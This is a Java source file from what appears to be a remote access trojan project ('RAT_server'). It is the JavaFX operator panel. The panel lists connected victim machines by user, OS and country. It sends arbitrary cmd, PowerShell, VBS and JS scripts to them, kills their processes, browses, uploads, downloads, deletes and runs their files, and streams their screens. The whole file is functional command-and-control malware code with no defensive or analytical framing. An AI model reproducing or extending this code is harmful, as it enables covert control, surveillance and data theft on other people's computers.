package electron.gui;

import java.awt.Toolkit;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.StringSelection;
import java.io.File;
import java.net.URISyntaxException;
import java.security.CodeSource;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Iterator;
import java.util.List;
import java.util.Optional;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.locks.LockSupport;

import org.json.simple.JSONObject;

import electron.RAT_server;
import electron.networking.FileReceiver;
import electron.networking.FileSender;
import electron.networking.Listener;
import electron.networking.NetData;
import electron.networking.ScreenV2Receiver;
import electron.networking.SocketHandler;
import electron.networking.packets.ClientInfo;
import electron.networking.packets.ProcessPacket;
import electron.networking.packets.ScriptFilePacket;
import electron.networking.packets.ExplorerPacketInput;
import electron.networking.packets.ExplorerPacketOutput;
import electron.networking.packets.OutputPacket;
import electron.utils.Utils;
import electron.utils.logger;
import javafx.application.Platform;
import javafx.beans.property.SimpleStringProperty;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.embed.swing.SwingFXUtils;
import javafx.event.EventHandler;
import javafx.fxml.FXML;
import javafx.scene.control.*;
import javafx.scene.control.Alert.AlertType;
import javafx.scene.image.Image;
import javafx.scene.image.ImageView;
import javafx.scene.image.WritableImage;
import javafx.scene.input.KeyCode;
import javafx.scene.input.KeyEvent;
import javafx.scene.input.MouseButton;
import javafx.scene.layout.AnchorPane;
import javafx.scene.text.Text;
import javafx.stage.FileChooser;

public class MainWindowControls {
	public static SocketHandler handler;
	private static int lastConsoleSize = 0;
	private String lastTaskmgrTime = "1";

	@FXML
	private TabPane connections_tabpane;
	@FXML
	private Tab tab_screenv2;
	@FXML
	private AnchorPane screen_pane;
	@FXML
	private TableView<ClientInfo> connections_table;
	@FXML
	private Text connections_connectedpcs;
	@FXML
	private TableColumn<ClientInfo, String> connections_table_addresscolumn;
	@FXML
	private TableColumn<ClientInfo, String> connections_table_usercolumn;
	@FXML
	private TableColumn<ClientInfo, String> connections_table_oscolumn;
	@FXML
	private TableColumn<ClientInfo, String> connections_table_countrycolumn;
	@FXML
	private TableColumn<ClientInfo, String> connections_table_nativeimagecolumn;
	@FXML
	private Text tasks_time;
	@FXML
	private TableView<ProcessPacket> tasks_table;
	@FXML
	private TableColumn<ProcessPacket, String> tasks_pid;
	@FXML
	private TableColumn<ProcessPacket, String> tasks_name;
	@FXML
	private TableColumn<ProcessPacket, String> tasks_user;
	@FXML
	private TableColumn<ProcessPacket, String> tasks_state;
	@FXML
	private TableColumn<ProcessPacket, String> tasks_memory;
	@FXML
	private TableColumn<ProcessPacket, String> tasks_cpu;
	@FXML
	private TableColumn<ProcessPacket, String> tasks_session;
	@FXML
	private TableColumn<ProcessPacket, String> tasks_title;
	@FXML
	private CheckBox tasks_freeze;
	@FXML
	private CheckBox tasks_fastmode;
	@FXML
	private TextField explorer_path;
	@FXML
	private ListView<String> explorer_list;
	@FXML
	private TextArea console_consoleview;
	@FXML
	private TextField console_commandfield;
	@FXML
	private Button console_sendbtn;
	@FXML
	private CheckBox console_scrolling;
	@FXML
	private CheckBox console_freeze;
	@FXML
	private MenuItem explorer_playfunction;
	@FXML
	private MenuItem explorer_runlistenerfunction;
	@FXML
	private MenuItem explorer_editfunction;
	@FXML
	private ImageView screen_image;
	@FXML
	private CheckBox screen_mode;
	@FXML
	private ImageView screenv2_image;
	@FXML
	private TextField messagebox_header;
	@FXML
	private TextField messagebox_text;
	@FXML
	private TextField messagebox_title;
	@FXML
	private ChoiceBox<String> messagebox_type;
	@FXML
	private TextArea messagebox_console;
	@FXML
	private TextArea script_code;
	@FXML
	private ChoiceBox<String> script_executor;
	@FXML
	private TextField settings_uitimeupdater;
	@FXML
	private CheckBox settings_screenv2;

	@FXML
	private void initialize() {
		// Configuring graphics components
		console_commandfield.setOnKeyPressed(new EventHandler<KeyEvent>() {
			@Override
			public void handle(KeyEvent ke) {
				if (ke.getCode().equals(KeyCode.ENTER)) {
					sendCommand();
				}
			}
		});
		// Generating items for ChoiceBoxes
		ObservableList<String> msbti = FXCollections.observableArrayList();
		msbti.add("INFO");
		msbti.add("ERROR");
		msbti.add("WARN");
		msbti.add("INPUT");
		msbti.add("CONFIRMATION");
		messagebox_type.setItems(msbti);
		ObservableList<String> executorsChoices = FXCollections.observableArrayList("cmd", "bat", "ps1", "psconsole",
				"vbs", "js");
		script_executor.setItems(executorsChoices);
		script_executor.getSelectionModel().select(0);
		// Styling some components
		messagebox_console.setStyle(
				"-fx-control-inner-background:#000000; -fx-font-family: Consolas; -fx-highlight-fill: #00ff00; -fx-highlight-text-fill: #000000; -fx-text-fill: #00ff00; ");
		console_consoleview.setStyle(
				"-fx-control-inner-background:#000000; -fx-font-family: Consolas; -fx-highlight-fill: #00ff00; -fx-highlight-text-fill: #000000; -fx-text-fill: #00ff00; ");
		String taskmgrstyle = getClass().getResource("/resources/taskmgr.css").toExternalForm();
		tasks_table.getStylesheets().add(taskmgrstyle);
		tasks_fastmode.setSelected(true);
		explorer_path.setOnKeyPressed(new EventHandler<KeyEvent>() {
			@Override
			public void handle(KeyEvent ke) {
				if (ke.getCode().equals(KeyCode.ENTER)) {
					sendExplorer();
				}
			}
		});
		explorer_list.setOnMouseClicked(event -> {
			if (event.getButton() == MouseButton.PRIMARY && event.getClickCount() == 2) {
				explorer_openAction();
			}
		});
		// Creating update thread
//		ScheduledExecutorService executor = Executors.newScheduledThreadPool(1);
//		executor.scheduleAtFixedRate(() -> {
//			Platform.runLater(() -> {
//				viewChaged();
//			});
//		}, 0, Integer.parseInt(settings_uitimeupdater.getText()), TimeUnit.MICROSECONDS);
		Runnable updateRunnable = new Runnable() {
			@Override
			public void run() {
				while (true) {
					Platform.runLater(() -> {
						viewChaged();
						tab_screenv2.setDisable(!settings_screenv2.isSelected());
					});
					try {
						Thread.currentThread().sleep(Integer.parseInt(settings_uitimeupdater.getText()));
					} catch (NumberFormatException | InterruptedException e) {
						logger.error("[UI_UPDATE_TASK]: can't update! Message: " + e.getMessage());
						Utils.showErrorMessage("Critical error", "UI error", "Can't update UI! Message: "
								+ e.getMessage() + "\n You must restart program to work with UI.");
						break;
					}
				}
			}
		};
		new Thread(updateRunnable).start();
	}

	public void updateClients() {
		if (NetData.getClients().isEmpty()) {
			connections_table.setItems(FXCollections.observableArrayList());
			handler = null;
			connections_connectedpcs.setText("Total connected: 0 PCs");
			return;
		}
		// Getting information for all clients
		ObservableList<ClientInfo> info = FXCollections.observableArrayList();
		for (SocketHandler client : NetData.getClients()) {
			if (client.getInfo() != null) {
				info.add(client.getInfo());
			}
		}
		if (info.isEmpty()) {
			connections_connectedpcs.setText("Total connected: 0 PCs");
			return;
		}
		// Updating table
		connections_table_addresscolumn.setCellValueFactory(cellData -> {
			SimpleStringProperty addressProperty = cellData.getValue().AddressProperty();
			return addressProperty != null ? addressProperty : new SimpleStringProperty("");
		});
		connections_table_usercolumn.setCellValueFactory(cellData -> {
			SimpleStringProperty addressProperty = cellData.getValue().UsernameProperty();
			return addressProperty != null ? addressProperty : new SimpleStringProperty("");
		});
		connections_table_oscolumn.setCellValueFactory(cellData -> {
			SimpleStringProperty addressProperty = cellData.getValue().OsProperty();
			return addressProperty != null ? addressProperty : new SimpleStringProperty("");
		});
		connections_table_countrycolumn.setCellValueFactory(cellData -> {
			SimpleStringProperty addressProperty = cellData.getValue().CountryProperty();
			return addressProperty != null ? addressProperty : new SimpleStringProperty("");
		});
		connections_table_nativeimagecolumn.setCellValueFactory(cellData -> {
			SimpleStringProperty addressProperty = cellData.getValue().NativeImageProperty();
			return addressProperty != null ? addressProperty : new SimpleStringProperty("");
		});
		connections_table.setItems(info);
		// Updating total PCs:
		connections_connectedpcs.setText("Total connected: " + info.size() + " PCs");
	}

	public SocketHandler getHandler(ClientInfo info) {
		for (SocketHandler handler : NetData.getClients()) {
			if (handler.getInfo() == info) {
				return handler;
			}
		}
		return null;
	}

	/**
	 * It sets active socket
	 */
	@FXML
	private void setActiveSocket() {
		handler = getHandler(connections_table.getSelectionModel().getSelectedItem());
		if (handler == null) {
			return;
		}
		// logger.log("[electron.user.MainWindowControls.setActiveSocket]: set socket
		// to: " + handler.getName());
	}

	/**
	 * View change listener
	 */
	@FXML
	private void viewChaged() {
		String tabName = connections_tabpane.getSelectionModel().getSelectedItem().getText();
		if (tabName.equals("Console")) {
			updateConsoleTab();
		} else if (tabName.equals("Connections")) {
			updateClients();
		} else if (tabName.equals("Explorer")) {
			updateExplorer();
		} else if (tabName.equals("Screen")) {
			updateScreen();
		} else if (tabName.equals("MessageBox")) {
			updateMessageBox();
		} else if (tabName.equals("ScreenV2")) {
			updateScreenV2();
		} else if (tabName.equals("Tasks")) {
			updateTasks();
		} else {
			return;
		}
	}

	/*
	 * Script Tab Controls
	 */
	@FXML
	private void script_executeAction() {
		if (handler == null) {
			Utils.showErrorMessage("Incorrect action", "You must select client first!",
					"Select client in 'Connections' pane firstly.");
			logger.log("[electron.user.MainWindowControls.script_executeAction]: handler = null");
			return;
		}
		// Defining executor type
		String script = script_code.getText();
		ScriptFilePacket packet;
		switch (script_executor.getSelectionModel().getSelectedItem()) {
		case "cmd":
			packet = new ScriptFilePacket(ScriptFilePacket.EXECUTOR_CMD, script);
			if (!handler.send(packet.get().toJSONString())) {
				logger.error("[electron.user.MainWindowControls.script_executeAction]: error sending packet.");
				Utils.showErrorMessage("Socket Error", "Error sending script packet.",
						"Error sending script packet. Caused by SocketHandler.");
			}
			return;
		case "ps1":
			packet = new ScriptFilePacket(ScriptFilePacket.EXECUTOR_POWERSHELL, script);
			if (!handler.send(packet.get().toJSONString())) {
				logger.error("[electron.user.MainWindowControls.script_executeAction]: error sending packet.");
				Utils.showErrorMessage("Socket Error", "Error sending script packet.",
						"Error sending script packet. Caused by SocketHandler.");
			}
			return;
		case "psconsole":
			packet = new ScriptFilePacket(ScriptFilePacket.EXECUTOR_POWERSHELL_CONSOLE, script);
			if (!handler.send(packet.get().toJSONString())) {
				logger.error("[electron.user.MainWindowControls.script_executeAction]: error sending packet.");
				Utils.showErrorMessage("Socket Error", "Error sending script packet.",
						"Error sending script packet. Caused by SocketHandler.");
			}
			return;
		case "vbs":
			packet = new ScriptFilePacket(ScriptFilePacket.EXECUTOR_VBS, script);
			if (!handler.send(packet.get().toJSONString())) {
				logger.error("[electron.user.MainWindowControls.script_executeAction]: error sending packet.");
				Utils.showErrorMessage("Socket Error", "Error sending script packet.",
						"Error sending script packet. Caused by SocketHandler.");
			}
			return;
		case "bat":
			packet = new ScriptFilePacket(ScriptFilePacket.EXECUTOR_BAT, script);
			if (!handler.send(packet.get().toJSONString())) {
				logger.error("[electron.user.MainWindowControls.script_executeAction]: error sending packet.");
				Utils.showErrorMessage("Socket Error", "Error sending script packet.",
						"Error sending script packet. Caused by SocketHandler.");
			}
			return;
		case "js":
			packet = new ScriptFilePacket(ScriptFilePacket.EXECUTOR_JS, script);
			if (!handler.send(packet.get().toJSONString())) {
				logger.error("[electron.user.MainWindowControls.script_executeAction]: error sending packet.");
				Utils.showErrorMessage("Socket Error", "Error sending script packet.",
						"Error sending script packet. Caused by SocketHandler.");
			}
			return;
		default:
			Utils.showErrorMessage("Internal error", "Error",
					"Internal error in script_executeAction(): switch(script_executor)");
		}
	}

	@FXML
	private void script_importAction() {
		FileChooser fileChooser = new FileChooser();
		fileChooser.setTitle("Import code from file");
		fileChooser.getExtensionFilters().addAll(new FileChooser.ExtensionFilter("All Text Files", "*.*"),
				new FileChooser.ExtensionFilter("CMD Script", "*.cmd"),
				new FileChooser.ExtensionFilter("BAT Script", "*.bat"),
				new FileChooser.ExtensionFilter("PS Script", "*.ps1"),
				new FileChooser.ExtensionFilter("JS Script", "*.js"),
				new FileChooser.ExtensionFilter("VBS Script", "*.vbs"));
		fileChooser.setInitialDirectory(new File("scripts"));
		File file = fileChooser.showOpenDialog(RAT_server.getInitialStage());
		if (file != null) {
			logger.log("[electron.user.MainWindowControls.script_importAction]: importing: " + file.getAbsolutePath());
			String result = Utils.getFileLineWithSeparator(Utils.getFileLines(file.getAbsolutePath()), "\n");
			script_code.setText(result);
		}
	}

	/*
	 * Task Manager Tab Controls
	 */
	private void updateTasks() {
		if (handler == null) {
			tasks_table.setItems(FXCollections.observableArrayList());
			return;
		}
		tasks_time.setText(handler.getLastTaskmgrDate());
		OutputPacket packet;
		// If fastmode enabled
		if (tasks_fastmode.isSelected()) {
			packet = new OutputPacket("/tasklistfast");
		} else {
			packet = new OutputPacket("/tasklist");
		}
		if (!handler.send(packet.get())) {
			logger.error("[electron.user.MainWindowControls.updateTasks]: error sending packet.");
		}
		if (handler.getTaskList() == null) {
			return;
		}
		// Getting information for all processes
		ObservableList<ProcessPacket> procs = FXCollections.observableArrayList();
		procs.addAll(handler.getTaskList());
		if (procs.isEmpty()) {
			return;
		}
		// Showing data
		tasks_pid.setCellValueFactory(cellData -> {
			SimpleStringProperty pid = cellData.getValue().getPid();
			return pid != null ? pid : new SimpleStringProperty("-");
		});
		tasks_name.setCellValueFactory(cellData -> {
			SimpleStringProperty pid = cellData.getValue().getName();
			return pid != null ? pid : new SimpleStringProperty("-");
		});
		tasks_user.setCellValueFactory(cellData -> {
			SimpleStringProperty pid = cellData.getValue().getUser();
			return pid != null ? pid : new SimpleStringProperty("-");
		});
		tasks_state.setCellValueFactory(cellData -> {
			SimpleStringProperty pid = cellData.getValue().getState();
			return pid != null ? pid : new SimpleStringProperty("-");
		});
		tasks_memory.setCellValueFactory(cellData -> {
			SimpleStringProperty pid = cellData.getValue().getMemory();
			return pid != null ? pid : new SimpleStringProperty("-");
		});
		tasks_cpu.setCellValueFactory(cellData -> {
			SimpleStringProperty pid = cellData.getValue().getCpu_time();
			return pid != null ? pid : new SimpleStringProperty("-");
		});
		tasks_session.setCellValueFactory(cellData -> {
			SimpleStringProperty pid = cellData.getValue().getSession();
			return pid != null ? pid : new SimpleStringProperty("-");
		});
		tasks_title.setCellValueFactory(cellData -> {
			SimpleStringProperty pid = cellData.getValue().getTitle();
			return pid != null ? pid : new SimpleStringProperty("-");
		});
		if (handler.getLastTaskmgrDate().equals(lastTaskmgrTime) || tasks_freeze.isSelected()) {
			return;
		}
		tasks_table.setItems(procs);
		lastTaskmgrTime = handler.getLastTaskmgrDate();
	}

	@FXML
	private void tasks_killAction() {
		ProcessPacket packet = tasks_table.getSelectionModel().getSelectedItem();
		if (handler == null) {
			return;
		}
		if (!packet.getSession().getValue().equalsIgnoreCase("Linux")) {
			// Windows
			OutputPacket packet1 = new OutputPacket("taskkill /pid " + packet.getPid().getValue() + " /t /f");
			if (!handler.send(packet1.get())) {
				logger.error("[electron.user.MainWindowControls.tasks_killAction]: error sending packet.");
			}
		} else {
			// Linux
			OutputPacket packet2 = new OutputPacket("kill -9 " + packet.getPid().getValue());
			if (!handler.send(packet2.get())) {
				logger.error("[electron.user.MainWindowControls.tasks_killAction]: error sending packet.");
			}
		}
	}

	@FXML
	private void tasks_copyProcInfo() {
		ProcessPacket packet = tasks_table.getSelectionModel().getSelectedItem();
		StringSelection stringSelection = new StringSelection(
				packet.getPid().getValue() + " | " + packet.getName().getValue() + " | " + packet.getUser().getValue()
						+ " | " + packet.getSession().getValue() + " | " + packet.getTitle().getValue());
		Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
		clipboard.setContents(stringSelection, null);
		Utils.showMessage("Success", "Success", "Copied text to chipboard.");
	}

	/*
	 * MessageBox Tab Controls
	 */
	private void updateMessageBox() {
		if (handler == null) {
			return;
		}
		// Updating console
	}

	@FXML
	private void messagebox_send() {
		if (handler == null) {
			Utils.showErrorMessage("Incorrect action", "You must select client first!",
					"Select client in 'Connections' pane firstly.");
			logger.log("[electron.user.MainWindowControls.messagebox_send]: handler = null");
			return;
		}
		// Getting data
		String title = messagebox_title.getText();
		String header = messagebox_header.getText();
		String text = messagebox_text.getText();
		int type = messagebox_type.getSelectionModel().getSelectedIndex();
		// Cleaning text
		messagebox_title.setText("");
		messagebox_header.setText("");
		messagebox_text.setText("");
	}

	/*
	 * Screen Tab Controls
	 */
	private void updateScreen() {
		if (handler == null || handler.getScreen() == null) {
			return;
		}
		// Resize system
		screen_image.setPreserveRatio(screen_mode.isSelected());
		screen_image.setFitWidth(screen_pane.getWidth());
		screen_image.setFitHeight(screen_pane.getHeight());
		WritableImage img = SwingFXUtils.toFXImage(handler.getScreen(), null);
		screen_image.setImage(img);
	}

	@FXML
	private void freezeScreen() {
		FreezeScreenImage.paint(MainWindowControls.handler.getScreen());
	}

	@FXML
	private void toggleScreen() {
		if (handler == null) {
			Utils.showErrorMessage("Incorrect action", "You must select client first!",
					"Select client in 'Connections' pane firstly.");
			return;
		}
		OutputPacket packet = new OutputPacket("/screen");
		// Sending it to selected client
		if (!handler.send(packet.get())) {
			logger.error("[electron.user.MainWindowControls.toggleScreen]: error sending packet.");
		}
	}

	/*
	 * ScreenV2 Tab Controls
	 */
	private void updateScreenV2() {
		if (handler == null || ScreenV2Receiver.getImage() == null) {
			return;
		}
		WritableImage img = SwingFXUtils.toFXImage(ScreenV2Receiver.getImage(), null);
		screenv2_image.setImage(img);
	}

	@FXML
	private void freezeScreenV2() {
		FreezeScreenImage.paint(ScreenV2Receiver.getImage());
	}

	@FXML
	private void toggleScreenV2() {
		if (handler == null) {
			Utils.showErrorMessage("Incorrect action", "You must select client first!",
					"Select client in 'Connections' pane firstly.");
			return;
		}
		OutputPacket packet = new OutputPacket("/screenv2");
		// Sending it to selected client
		if (!handler.send(packet.get())) {
			logger.error("[electron.user.MainWindowControls.toggleScreenV2]: error sending packet.");
		}
	}

	/*
	 * Explorer Tab Controls
	 */
	private void updateExplorer() {
		if (handler == null || handler.getInfo() == null) {
			return;
		}
		if (handler.isWindows()) {
			// If OS is Windows
			if (explorer_path.getText().isEmpty()) {
				// If path is empty
				explorer_path.setText("C:\\");
				sendExplorer();
			}
		} else {
			// If OS is Linux
			if (explorer_path.getText().isEmpty()) {
				// If path is empty
				explorer_path.setText("/");
				sendExplorer();
			}
		}
		// parsing data
		ExplorerPacketInput inpacket = handler.getExplorerInfo();
		if (inpacket == null) {
			return;
		}
		if (inpacket.getFiles().isEmpty()) {
			explorer_list.setItems(FXCollections.observableArrayList());
			return;
		}
		ObservableList<String> info = FXCollections.observableArrayList();
		for (Object item : inpacket.getFiles()) {
			info.add(String.valueOf(item));
		}
		explorer_list.setItems(info);
	}

	@FXML
	private void explorer_runAction() {
		if (handler == null) {
			Utils.showErrorMessage("Incorrect action", "You must select client first!",
					"Select client in 'Connections' pane firstly.");
			return;
		}
		if (explorer_list.getSelectionModel().getSelectedItem().isEmpty()) {
			Utils.showMessage("Incorrect action", "You must select file to open", "You must select file to open");
		} else {
			String f = explorer_list.getSelectionModel().getSelectedItem();
			// Creating packet to send
			OutputPacket packet;
			if (handler.isWindows()) {
				packet = new OutputPacket("cd " + explorer_path.getText() + "&start " + f);
			} else {
				packet = new OutputPacket("cd " + explorer_path.getText() + "; ./ " + f);
			}
			// Sending it to selected client
			if (!handler.send(packet.get())) {
				logger.error("[electron.user.MainWindowControls.explorer_runAction]: error sending packet.");
				return;
			}
			Utils.showMessage("runAction", "Success", "Started file: " + f);
		}
	}

	@FXML
	private void explorer_runListenerAction() {
		if (handler == null) {
			Utils.showErrorMessage("Incorrect action", "You must select client first!",
					"Select client in 'Connections' pane firstly.");
			return;
		}
		if (explorer_list.getSelectionModel().getSelectedItem().isEmpty()) {
			Utils.showErrorMessage("Incorrect action", "You must select file to open", "You must select file to open");
		} else {
			String f = explorer_list.getSelectionModel().getSelectedItem();
			// Creating packet to send
			OutputPacket packet = new OutputPacket("cd " + explorer_path.getText() + "&" + "\"" + f + "\"");
			// Sending it to selected client
			if (!handler.send(packet.get())) {
				logger.error("[electron.user.MainWindowControls.explorer_runListenerAction]: error sending packet.");
				return;
			}
			Utils.showMessage("runListenerAction", "Success", "Started file: " + f);
		}
	}

	@FXML
	private void explorer_openAction() {
		String result = explorer_path.getText();
		if (explorer_list.getSelectionModel().getSelectedItem().isEmpty()) {
			Utils.showErrorMessage("Incorrect action", "You must select file to open", "You must select file to open");
		} else {
			if (result.endsWith("/") || result.endsWith("\\")) {
				result = result + explorer_list.getSelectionModel().getSelectedItem();
			} else {
				result = result + "/" + explorer_list.getSelectionModel().getSelectedItem();
			}
			explorer_path.setText(result);
			sendExplorer();
		}
	}

	@FXML
	private void explorer_backAction() {
		File f = new File(explorer_path.getText());
		explorer_path.setText(f.getParent());
		sendExplorer();
	}

	@FXML
	private void explorer_createAction() {
		if (handler == null) {
			Utils.showErrorMessage("Incorrect action", "You must select client first!",
					"Select client in 'Connections' pane firstly.");
			return;
		}
		TextInputDialog td = new TextInputDialog();
		td.setTitle("Create file");
		td.setContentText("Enter file to create:");
		Optional<String> a = td.showAndWait();
		String fname = a.get();
		logger.log("[electron.user.MainWindowControls.explorer_createAction] creating file: " + fname);
		String result = explorer_path.getText();
		if (result.endsWith("/") || result.endsWith("\\")) {
			result = result + fname;
		} else {
			result = result + "/" + fname;
		}
		ExplorerPacketOutput packet = new ExplorerPacketOutput(explorer_path.getText(), "create " + result);
		handler.send(packet.get());
	}

	@FXML
	private void explorer_deleteAction() {
		if (handler == null) {
			Utils.showErrorMessage("Incorrect action", "You must select client first!",
					"Select client in 'Connections' pane firstly.");
			return;
		}
		String result = explorer_path.getText();
		if (explorer_list.getSelectionModel().getSelectedItem().isEmpty()) {
			Utils.showErrorMessage("Incorrect action", "You must select file!", "Select file you want to delete");
		} else {
			if (result.endsWith("/") || result.endsWith("\\")) {
				result = result + explorer_list.getSelectionModel().getSelectedItem();
			} else {
				result = result + "/" + explorer_list.getSelectionModel().getSelectedItem();
			}
			ExplorerPacketOutput packet = new ExplorerPacketOutput(explorer_path.getText(), "del " + result);
			handler.send(packet.get());
		}
	}

	@FXML
	private void explorer_editAction() {
		if (handler == null) {
			Utils.showErrorMessage("Incorrect action", "You must select client first!",
					"Select client in 'Connections' pane firstly.");
			return;
		}
		String result = explorer_path.getText();
		if (explorer_list.getSelectionModel().getSelectedItem().isEmpty()) {
			Utils.showErrorMessage("Incorrect action", "You must select file to edit!",
					"You must select file to edit!");
		} else {
			if (result.endsWith("/") || result.endsWith("\\")) {
				result = result + explorer_list.getSelectionModel().getSelectedItem();
			} else {
				result = result + "/" + explorer_list.getSelectionModel().getSelectedItem();
			}
			OutputPacket packet = new OutputPacket("/edit=" + result);
			if (!handler.send(packet.get())) {
				logger.error("[electron.user.MainWindowControls.explorer_editAction]: error sending packet.");
			}
		}
	}

	@FXML
	private void explorer_contextOpened() {
		if (!explorer_list.getSelectionModel().getSelectedItem().isEmpty()) {
			explorer_playfunction.setVisible(explorer_list.getSelectionModel().getSelectedItem().endsWith(".wav"));
			explorer_runlistenerfunction.setVisible(handler.isWindows());
			explorer_editfunction.setVisible(explorer_list.getSelectionModel().getSelectedItem().contains("."));
		}
	}

	@FXML
	private void explorer_play() {
		if (handler == null) {
			Utils.showErrorMessage("Incorrect action", "You must select client first!",
					"Select client in 'Connections' pane firstly.");
			return;
		}
		String result = explorer_path.getText();
		if (result.endsWith("/") || result.endsWith("\\")) {
			result = result + explorer_list.getSelectionModel().getSelectedItem();
		} else {
			result = result + "/" + explorer_list.getSelectionModel().getSelectedItem();
		}
		// Creating packet to send
		OutputPacket packet = new OutputPacket("/player " + result);
		// Sending it to selected client
		if (!handler.send(packet.get())) {
			logger.error("[electron.user.MainWindowControls.explorer_play]: error sending packet.");
		}
	}

	@FXML
	private void explorer_upload() {
		if (handler == null) {
			Utils.showErrorMessage("Incorrect action", "You must select client first!",
					"Select client in 'Connections' pane firstly.");
			return;
		}
		// Selecting file to send
		FileChooser fileChooser = new FileChooser();
		fileChooser.setTitle("Open File");
		File file = fileChooser.showOpenDialog(RAT_server.getInitialStage());
		if (file != null) {
			// Starting server
			new FileSender(file).start();
			// Starting receiver
			JSONObject packet = new JSONObject();
			packet.put("packettype", "2");
			packet.put("type", "1");
			packet.put("path", explorer_path.getText() + "/" + file.getName());
			handler.send(packet.toJSONString());
		}
	}

	@FXML
	private void explorer_download() {
		if (handler == null) {
			Utils.showErrorMessage("Incorrect action", "You must select client first!",
					"Select client in 'Connections' pane firstly.");
			return;
		}
		String result = explorer_path.getText();
		if (explorer_list.getSelectionModel().getSelectedItem().isEmpty()) {
			Alert al = new Alert(AlertType.ERROR);
			al.setTitle("Incorrect action");
			al.setContentText("You must select file to download.");
			al.show();
		} else {
			if (result.endsWith("/") || result.endsWith("\\")) {
				result = result + explorer_list.getSelectionModel().getSelectedItem();
			} else {
				result = result + "/" + explorer_list.getSelectionModel().getSelectedItem();
			}
			JSONObject packet = new JSONObject();
			packet.put("packettype", "2");
			packet.put("type", "0");
			packet.put("path", result);
			if (System.getProperty("os.name").toLowerCase().contains("windows")) {
				new FileReceiver(Listener.getPort() + 1, System.getProperty("user.home") + "/Downloads/"
						+ explorer_list.getSelectionModel().getSelectedItem()).start();
			} else {
				new FileReceiver(Listener.getPort() + 1,
						System.getProperty("user.home") + "/" + explorer_list.getSelectionModel().getSelectedItem())
						.start();
			}
			handler.send(packet.toJSONString());
		}
	}

	@FXML
	private void sendExplorer() {
		if (handler == null) {
			logger.log("[electron.user.MainWindowControls.sendExplorer]: handler = null");
			return;
		}
		ExplorerPacketOutput packet = new ExplorerPacketOutput(explorer_path.getText(), "");
		handler.send(packet.get());
	}

	/*
	 * Console Tab Controls
	 */
	private void updateConsoleTab() {
		if (console_scrolling.isSelected()) {
			console_consoleview.setScrollTop(Double.MAX_VALUE);
		}
		if (handler == null) {
			console_consoleview.setText("Select client to work with, please.");
			return;
		}
		if (console_freeze.isSelected()) {
			return;
		}
		String result = "";
		if (handler.getMessages() == null || handler.getMessages().size() == lastConsoleSize) {
			return;
		} else {
			lastConsoleSize = handler.getMessages().size();
		}
		// ConcurrentModifictionException fix
		List<String> msgs = Collections.synchronizedList(new ArrayList<>());
		msgs.addAll(handler.getMessages());
		for (String message : msgs) {
			result = result + message + "\n";
		}
		msgs = null;
		console_consoleview.setText(result);
	}

	@FXML
	private void console_clearAction() {
		console_consoleview.clear();
		if (handler == null) {
			return;
		}
		handler.clearLog();
	}

	@FXML
	private void sendCommand() {
		if (handler == null) {
			Utils.showErrorMessage("Incorrect action", "You must select client first!",
					"Select client in 'Connections' pane firstly.");
			return;
		}
		String command = console_commandfield.getText();
		// Creating packet to send
		OutputPacket packet = new OutputPacket(command);
		// Sending it to selected client
		if (!handler.send(packet.get())) {
			logger.error("[electron.user.MainWindowControls.sendCommand]: error sending packet.");
		}
		handler.addMessageToLog("[SERVER]: sending: " + console_commandfield.getText());
		console_commandfield.setText("");
	}
}
